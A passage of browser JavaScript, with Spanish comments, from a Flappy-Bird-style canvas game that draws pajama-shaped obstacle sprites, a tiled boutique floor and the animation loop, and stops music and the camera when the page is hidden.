    const sw=pajamaSprite.naturalWidth, sh=pajamaSprite.naturalHeight;
    // Los extremos que están frente al corredor son ambos puños, no un solo pie.
    const bodyTop=down?y+waistH:y+cuffH;
    const bodyBottom=down?y+h-cuffH:y+h-waistH;
    if(bodyBottom>bodyTop){
      let dest=bodyTop;
      while(dest<bodyBottom){
        const piece=Math.min(tileH,bodyBottom-dest);
        ctx.drawImage(pajamaSprite,0,tileY,sw,piece,x,dest,PIPE_W,piece);
        dest+=piece;
      }
    }
    if(down){
      ctx.drawImage(pajamaSprite,0,0,sw,waistH,x,y,PIPE_W,waistH);
      ctx.drawImage(pajamaSprite,0,sh-cuffH,sw,cuffH,x,y+h-cuffH,PIPE_W,cuffH);
    }else{
      ctx.drawImage(pajamaSprite,0,sh-cuffH,sw,cuffH,x,y,PIPE_W,cuffH);
      ctx.drawImage(pajamaSprite,0,0,sw,waistH,x,y+h-waistH,PIPE_W,waistH);
    }
  }
  ctx.restore();
}

  ctx.imageSmoothingEnabled=false;
  const tileWidth=boutiqueGround.naturalWidth;
  const offset=Math.floor(scrollDistance)%tileWidth;
  for(let x=-offset;x<W;x+=tileWidth){
    ctx.drawImage(boutiqueGround,x,FLOOR,tileWidth,H-FLOOR);
  }
  ctx.restore();
}else{
  // Colores de respaldo mientras se prepara la textura integrada.
  ctx.fillStyle='#f4b0cc';ctx.fillRect(0,FLOOR,W,H-FLOOR);
  ctx.fillStyle='#aa3c70';ctx.fillRect(0,FLOOR,W,4);
  ctx.fillStyle='#ffdeed';ctx.fillRect(0,FLOOR+9,W,3);
}
bird();ctx.restore()}
function loop(now){let dt=last?Math.min((now-last)/16.6667,2.5):1;last=now;if(state==='ready')frame+=dt;update(dt);draw();requestAnimationFrame(loop)}
requestAnimationFrame(loop);
window.addEventListener('pagehide',()=>{if(finishTimer)clearTimeout(finishTimer);stopMusic();stopCamera();});
})();
